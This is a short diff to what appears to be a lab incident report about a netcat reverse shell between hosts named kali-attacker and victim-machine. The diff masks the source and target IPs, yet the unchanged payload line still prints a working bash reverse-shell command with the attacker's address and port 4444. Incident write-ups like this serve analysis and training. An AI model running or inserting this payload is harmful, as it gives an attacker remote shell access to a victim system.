@@ -32,8 +32,8 @@
 | 17:10:31 UTC | PAM login session opened and closed |
 
 ## Investigation
-- **Source IP:** 10.190.0.4 (kali-attacker)
-- **Target IP:** 10.190.0.7 (victim-machine)
+- **Source IP:** 10.190.0.x (kali-attacker)
+- **Target IP:** 10.190.0.x (victim-machine)
 - **Tool Used:** Netcat (nc) reverse shell
 - **Payload:** `bash -i >& /dev/tcp/10.190.0.4/4444 0>&1`
 - **Listener Port:** 4444
